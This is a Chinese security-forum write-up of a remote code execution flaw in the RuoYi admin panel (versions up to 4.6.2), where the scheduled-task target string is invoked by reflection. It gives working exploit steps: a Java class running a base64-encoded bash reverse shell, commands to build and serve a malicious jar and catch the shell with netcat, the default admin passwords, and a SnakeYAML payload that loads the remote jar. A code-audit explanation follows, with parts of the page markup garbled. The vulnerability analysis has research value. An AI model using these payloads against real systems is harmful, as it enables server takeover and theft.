> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [xz.aliyun.com](https://xz.aliyun.com/t/10687)

> 先知社区，先知安全技术社区

漏洞标题：若依后台 RCE  
漏洞类型：命令执行  
漏洞等级：严重  
影响范围：RuoYi<=4.6.2  
简要描述：由于若依后台计划任务处，对于传入的 "调用目标字符串" 没有任何校验，导致攻击者可以调用任意类、方法及参数触发反射执行命令。  
闲聊：最近正好在学 java，并且项目中又遇到若依，于是就顺手分析了一下这个漏洞，在下才疏学浅各位大佬勿喷！！！

#### 利用步骤：

1、利用 Github 项目生成恶意 jar 包：[https://github.com/artsploit/yaml-payload](https://github.com/artsploit/yaml-payload)  
先修改项目源码文件 src/artsploit/AwesomeScriptEngineFactory.java 执行 Linux 反弹 shell 命令

```
package artsploit;

import javax.script.ScriptEngine;
import javax.script.ScriptEngineFactory;
import java.io.IOException;
import java.util.List;

public class AwesomeScriptEngineFactory implements ScriptEngineFactory {

    public AwesomeScriptEngineFactory() {
        try {
            Runtime.getRuntime().exec("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjMuMy8xMjM0IDA+JjE=}|{base64,-d}|{bash,-i}");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
...
}
```

接着运行如下命令打包成 jar 文件

```
javac src/artsploit/AwesomeScriptEngineFactory.java
jar -cvf yaml-payload.jar -C src/ .
```

2、利用 python 监听 HTTP 请求，让受害者能够访问到 yaml-payload.jar。并且监听反弹 shell

```
python3 -m http.server 2333
```

```
nc -lvnp 1234
```

3、登录进入后台（默认密码 admin/admin123，ry/admin123），然后进入系统监控 / 定时任务 / 新增，添加计划任务。  
"调用目标字符串" 输入 YAML 语句：

```
org.yaml.snakeyaml.Yaml.load('!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://192.168.3.3:2333/yaml-payload.jar"]]]]')
```

[![](https://cdn.nlark.com/yuque/0/2021/png/357973/1639821570625-64c6f18b-a6c6-4862-963a-686a2ea26e3b.png#clientId=ue68eae55-4845-4&from=paste&height=445&id=u829c11d6&margin=%5Bobject%20Object%5D&></a></p><p></p><h4 id=)代码审计过程：](https://cdn.nlark.com/yuque/0/2021/png/357973/1639818556435-8bc93217-25fe-4f47-a311-9c2bb65e1f7a.png#clientId=ue68eae55-4845-4&from=paste&height=900&id=u162379a0&margin=%5Bobject%20Object%5D&><img class=)

[1、当我们添加并执行计划任务时，若依 (ruoyi) 会调用 com.ruoyi.quartz.util#JobInvokeUtil 解析并执行我们传入的数据  
这里的代码逻辑：  
beanName 获取传入的类名；  
methodName 获取传入的方法名；  
methodParams 获取传入方法的参数，如果参数异常会报错导致无法执行下一步；  
�  
接着判断传入的类名是否有效 (判断逻辑：是否含有小数点)，有效的话就会调用 Class.forName(beanName).newInstance(); 进行实例化，然后运行 invokeMethod(bean, methodName, methodParams); 执行该类对应的方法  
](https://cdn.nlark.com/yuque/0/2021/png/357973/1639818556435-8bc93217-25fe-4f47-a311-9c2bb65e1f7a.png#clientId=ue68eae55-4845-4&from=paste&height=900&id=u162379a0&margin=%5Bobject%20Object%5D&><img class=)[![](https://cdn.nlark.com/yuque/0/2021/png/357973/1639817050808-aefb6702-b5f1-4560-8688-08a53d7649be.png#clientId=ue68eae55-4845-4&from=paste&height=468&id=u47df42a0&margin=%5Bobject%20Object%5D&></a><br>
2、可能直接贴代码大家不知道数据是怎么传输的，现在我传入一串如下数据，然后调试一下大家就明白了 (这里有个坑，传入的字符串必须用单引号包含，不然会出现问题，尤其是 EXP 的时候，刚开始复现漏洞就因为这里弄了好久还以为是玄学，感兴趣的可以看看 com.ruoyi.quartz.util#getMethodParams)</p><p></p><pre class=)java.lang.xxx.func('aaa')](https://cdn.nlark.com/yuque/0/2021/png/357973/1639815639321-e85ac05f-29b0-4162-b97b-5dc3e685c140.png#clientId=ue68eae55-4845-4&from=paste&height=900&id=ua937f630&margin=%5Bobject%20Object%5D&><img class=)

[![](https://cdn.nlark.com/yuque/0/2021/png/357973/1639820133920-be3c938f-d43b-4b4e-9027-b18c8f60a1f2.png#clientId=ue68eae55-4845-4&from=paste&height=900&id=u4503339b&margin=%5Bobject%20Object%5D&></a><br>
【+】我们传入的是 java.lang.xxx.func('aaa')</p><p></p><ul>
<li>beanName = )](https://cdn.nlark.com/yuque/0/2021/png/357973/1639818296854-9ce2ab6a-6de9-43eb-a7d5-6c2f22258529.png#clientId=ue68eae55-4845-4&from=paste&height=900&id=u65218cab&margin=%5Bobject%20Object%5D&><img class=)

*   [methodName = "func"](https://cdn.nlark.com/yuque/0/2021/png/357973/1639818296854-9ce2ab6a-6de9-43eb-a7d5-6c2f22258529.png#clientId=ue68eae55-4845-4&from=paste&height=900&id=u65218cab&margin=%5Bobject%20Object%5D&><img class=)
[*   methodParams = "aaa"

最终执行的反射代码为：Class.forName("java.lang.xxx").getDeclaredMethod("func", String.class).invoke(Class.forName("java.lang.xxx").newInstance(), "aaa")  
​

3、由于反射时所需要的：类、方法、参数都是我们可控的，所以我们只需传入一个能够执行命令的类方法就能达到 getshell 的目的，该类只需要满足如下几点要求即可：

*   具有 public 类型的无参构造方法
*   自身具有 public 类型且可以执行命令的方法

​

](https://cdn.nlark.com/yuque/0/2021/png/357973/1639818296854-9ce2ab6a-6de9-43eb-a7d5-6c2f22258529.png#clientId=ue68eae55-4845-4&from=paste&height=900&id=u65218cab&margin=%5Bobject%20Object%5D&><img class=)

[4、在网上看文章发现大佬们找到 _**org.yaml.snakeyaml.Yaml** _满足这些条件，YAML 执行命令参考:](https://cdn.nlark.com/yuque/0/2021/png/357973/1639818296854-9ce2ab6a-6de9-43eb-a7d5-6c2f22258529.png#clientId=ue68eae55-4845-4&from=paste&height=900&id=u65218cab&margin=%5Bobject%20Object%5D&><img class=) [浅蓝大佬文章](http://www.b1ue.cn/archives/239.html)

*   个人比较喜欢调用 RMI 来执行命令，但是若依 (ruoyi) 调用 RMI 会报错，所以只能调用远程 jar 进行命令执行

```
import org.yaml.snakeyaml.Yaml;
import java.lang.reflect.InvocationTargetException;

public class YamlDemo {
    public static void main(String[] args) throws ClassNotFoundException, IllegalAccessException, InstantiationException, NoSuchMethodException, InvocationTargetException {
        Yaml yaml = new Yaml();
        yaml.load("!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ['http://1.1.1.1:2333/Demo.jar']]]]");
        //yaml.load("!!com.sun.rowset.JdbcRowSetImpl {dataSourceName: 'rmi://127.0.0.1:9999/t', autoCommit: true}");
        //Class.forName("org.yaml.snakeyaml.Yaml").getMethod("load", String.class).invoke(Class.forName("org.yaml.snakeyaml.Yaml").newInstance(), "!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ['http://192.168.3.3:2333/Demo.jar']]]]");
    }
}
```

5、于是我们构造出最终传入的 payload 为

```
org.yaml.snakeyaml.Yaml.load('!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://192.168.3.3:2333/yaml-payload.jar"]]]]')
```